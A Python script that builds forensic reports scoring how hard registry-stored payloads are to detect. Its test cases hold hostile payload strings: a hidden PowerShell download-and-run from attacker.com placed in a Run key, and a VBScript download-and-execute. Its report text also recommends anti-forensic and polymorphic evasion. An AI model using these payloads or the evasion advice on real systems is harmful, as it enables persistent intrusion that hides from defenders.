#!/usr/bin/env python3
"""
Forensic Registry Storage Report Generator
Creates detailed forensic analysis reports for registry-based payload storage
"""

import json
import sys
from datetime import datetime
from forensic_registry_tester import (
    ForensicRegistryTester, DetectionMethod, ForensicReport
)


def format_difficulty_level(score: float) -> str:
    """Convert difficulty score to human-readable level"""
    if score >= 0.8:
        return "VERY DIFFICULT to detect"
    elif score >= 0.6:
        return "DIFFICULT to detect"
    elif score >= 0.4:
        return "MODERATE difficulty"
    elif score >= 0.2:
        return "EASY to detect"
    else:
        return "VERY EASY to detect"


def format_confidence_level(conf: float) -> str:
    """Convert confidence score to level"""
    if conf >= 0.9:
        return "VERY HIGH"
    elif conf >= 0.7:
        return "HIGH"
    elif conf >= 0.5:
        return "MODERATE"
    elif conf >= 0.3:
        return "LOW"
    else:
        return "VERY LOW"


def generate_text_report(report: ForensicReport) -> str:
    """Generate detailed text forensic report"""
    lines = []

    # Header
    lines.append("=" * 80)
    lines.append("FORENSIC REGISTRY STORAGE ANALYSIS REPORT".center(80))
    lines.append("=" * 80)
    lines.append("")
    lines.append(f"Report Generated: {datetime.now().isoformat()}")
    lines.append("")

    # Payload Information
    lines.append("PAYLOAD INFORMATION".center(80))
    lines.append("-" * 80)
    lines.append(f"Payload:              {report.payload[:70]}{'...' if len(report.payload) > 70 else ''}")
    lines.append(f"Payload Hash (SHA256): {report.payload_hash}")
    lines.append(f"Encoding Method:      {report.encoding_method.upper()}")
    lines.append(f"Registry Hive:        {report.registry_hive}")
    lines.append(f"Registry Path:        {report.registry_path}")
    lines.append("")

    # Size Analysis
    lines.append("SIZE ANALYSIS".center(80))
    lines.append("-" * 80)
    lines.append(f"Original Payload Size:     {report.size_analysis['original_payload']:,} bytes")
    lines.append(f"Encoded Payload Size:      {report.size_analysis['encoded_payload']:,} bytes")
    lines.append(f"Encoding Overhead:        +{report.size_analysis['encoding_overhead']:,} bytes ({(report.size_analysis['encoding_overhead']/max(report.size_analysis['original_payload'],1)*100):.1f}%)")
    lines.append(f"VBS Code Size:            {report.size_analysis['vbs_code']:,} bytes")
    lines.append(f"Total Storage Requirement: {report.size_analysis['total_size']:,} bytes")
    lines.append("")

    # Detection Difficulty Assessment
    lines.append("DETECTION DIFFICULTY ASSESSMENT".center(80))
    lines.append("-" * 80)
    lines.append(f"Overall Detection Difficulty: {format_difficulty_level(report.overall_detection_difficulty)}")
    lines.append(f"Difficulty Score: {report.overall_detection_difficulty:.2f}/1.00")
    lines.append("")
    lines.append("Interpretation:")
    lines.append("- Scores closer to 1.0 indicate HARDER detection (better evasion)")
    lines.append("- Scores closer to 0.0 indicate EASIER detection (weaker evasion)")
    lines.append("")

    # Evasion Techniques
    lines.append("EVASION TECHNIQUES EMPLOYED".center(80))
    lines.append("-" * 80)
    for i, technique in enumerate(report.evasion_techniques_used, 1):
        lines.append(f"  {i}. {technique}")
    lines.append("")

    # Detection Methods Analysis
    lines.append("FORENSIC DETECTION ANALYSIS".center(80))
    lines.append("-" * 80)
    lines.append(f"Methods Analyzed: {len(report.findings)}")
    lines.append(f"Methods with Positive Detections: {len(report.detectable_methods)}")
    lines.append("")

    # Individual findings
    for finding in report.findings:
        status = "✓ DETECTED" if finding.detected else "✗ NOT DETECTED"
        lines.append(f"\n[{status}] {finding.method.value.replace('_', ' ').title()}")
        lines.append(f"  Confidence Level: {format_confidence_level(finding.confidence)} ({finding.confidence:.2f})")
        lines.append(f"  Detection Difficulty: {format_difficulty_level(finding.difficulty_score)} ({finding.difficulty_score:.2f})")
        lines.append(f"  Evidence: {finding.evidence}")
        if finding.payload_fragment:
            lines.append(f"  Fragment: {finding.payload_fragment[:60]}{'...' if len(finding.payload_fragment) > 60 else ''}")

    lines.append("")
    lines.append("=" * 80)

    # Summary
    lines.append("\nFORENSIC INVESTIGATION SUMMARY".center(80))
    lines.append("-" * 80)

    if len(report.detectable_methods) > 0:
        lines.append(f"\nWARNING: Payload is detectable using {len(report.detectable_methods)} forensic method(s):")
        for method in report.detectable_methods:
            lines.append(f"  • {method.replace('_', ' ').title()}")
    else:
        lines.append("\nPASSED: Payload could not be detected using tested forensic methods")

    # Recommend improvements if needed
    if report.overall_detection_difficulty < 0.5:
        lines.append("\nRECOMMENDED IMPROVEMENTS:")
        lines.append("  • Consider using more sophisticated obfuscation techniques")
        lines.append("  • Implement anti-forensic countermeasures")
        lines.append("  • Use alternative encoding schemes")
        lines.append("  • Consider code obfuscation and polymorphic techniques")

    lines.append("")
    lines.append("=" * 80)

    return "\n".join(lines)


def generate_json_report(report: ForensicReport) -> str:
    """Generate JSON forensic report"""
    json_data = {
        "report_type": "forensic_registry_storage_analysis",
        "generated_at": datetime.now().isoformat(),
        "payload": {
            "content": report.payload,
            "hash_sha256": report.payload_hash,
            "encoding_method": report.encoding_method
        },
        "registry_location": {
            "hive": report.registry_hive,
            "path": report.registry_path
        },
        "size_analysis": report.size_analysis,
        "detection_assessment": {
            "overall_difficulty_score": report.overall_detection_difficulty,
            "difficulty_level": format_difficulty_level(report.overall_detection_difficulty),
            "methods_with_detections": len(report.detectable_methods),
            "detectable_methods": report.detectable_methods
        },
        "evasion_techniques": report.evasion_techniques_used,
        "findings": [
            {
                "method": finding.method.value,
                "detected": finding.detected,
                "confidence": finding.confidence,
                "confidence_level": format_confidence_level(finding.confidence),
                "difficulty_score": finding.difficulty_score,
                "evidence": finding.evidence,
                "payload_fragment": finding.payload_fragment
            }
            for finding in report.findings
        ]
    }

    return json.dumps(json_data, indent=2)


def generate_csv_report(report: ForensicReport) -> str:
    """Generate CSV forensic report"""
    lines = [
        "Detection_Method,Detected,Confidence,Confidence_Level,Difficulty_Score,Evidence"
    ]

    for finding in report.findings:
        method = finding.method.value.replace(',', '_')
        detected = "YES" if finding.detected else "NO"
        confidence = f"{finding.confidence:.2f}"
        conf_level = format_confidence_level(finding.confidence)
        difficulty = f"{finding.difficulty_score:.2f}"
        evidence_text = finding.evidence.replace('"', '""')
        evidence = f'"{evidence_text}"'

        lines.append(f"{method},{detected},{confidence},{conf_level},{difficulty},{evidence}")

    return "\n".join(lines)


def run_comprehensive_analysis():
    """Run comprehensive forensic analysis on various payloads"""
    tester = ForensicRegistryTester()

    test_cases = [
        {
            "name": "PowerShell Command Execution",
            "payload": "powershell.exe -Command \"Write-Host 'System Update'\"",
            "encoding": "base64",
            "registry_path": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "registry_hive": "HKLM"
        },
        {
            "name": "CMD Reverse Shell",
            "payload": "cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell')",
            "encoding": "hex",
            "registry_path": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "registry_hive": "HKCU"
        },
        {
            "name": "VBScript Download and Execute",
            "payload": "cscript.exe http://attacker.com/payload.vbs",
            "encoding": "base64",
            "registry_path": "Software\\Test\\Update",
            "registry_hive": "HKCU"
        },
        {
            "name": "Long Obfuscated Payload",
            "payload": "powershell.exe " + "-nop " * 50 + "-c Write-Host",
            "encoding": "hex",
            "registry_path": "Software\\Microsoft\\Windows",
            "registry_hive": "HKCU"
        }
    ]

    reports = []
    for test in test_cases:
        print(f"\n[*] Analyzing: {test['name']}")
        report = tester.run_analysis(
            payload=test['payload'],
            registry_hive=test['registry_hive'],
            registry_path=test['registry_path'],
            encoding=test['encoding']
        )
        reports.append((test['name'], report))

    return reports


def main():
    """Main entry point"""
    print("[*] Running Forensic Registry Storage Analysis")
    print("[*] Testing payload detection difficulty against forensic tools\n")

    # Run analysis
    reports = run_comprehensive_analysis()

    # Generate reports
    print("\n[*] Generating forensic reports...\n")

    for test_name, report in reports:
        print(f"\n{'='*80}")
        print(f"Test Case: {test_name}")
        print(f"{'='*80}")

        # Text report
        text_report = generate_text_report(report)
        print(text_report)

        # Save reports to files
        safe_name = test_name.lower().replace(" ", "_")

        with open(f"/tmp/forensic_report_{safe_name}.txt", "w") as f:
            f.write(text_report)

        with open(f"/tmp/forensic_report_{safe_name}.json", "w") as f:
            f.write(generate_json_report(report))

        with open(f"/tmp/forensic_report_{safe_name}.csv", "w") as f:
            f.write(generate_csv_report(report))

        print(f"\n[+] Reports saved for: {test_name}")

    # Summary statistics
    print("\n" + "=" * 80)
    print("ANALYSIS SUMMARY".center(80))
    print("=" * 80)

    total_difficulty = sum(r[1].overall_detection_difficulty for r in reports) / len(reports)
    avg_detections = sum(len(r[1].detectable_methods) for r in reports) / len(reports)

    print(f"\nAverage Detection Difficulty: {format_difficulty_level(total_difficulty)}")
    print(f"Average Difficulty Score: {total_difficulty:.2f}/1.00")
    print(f"Average Detections per Payload: {avg_detections:.1f}")
    print(f"\nTotal Test Cases: {len(reports)}")
    print("Report files saved to: /tmp/forensic_report_*.txt, .json, .csv")

    return reports


if __name__ == "__main__":
    main()
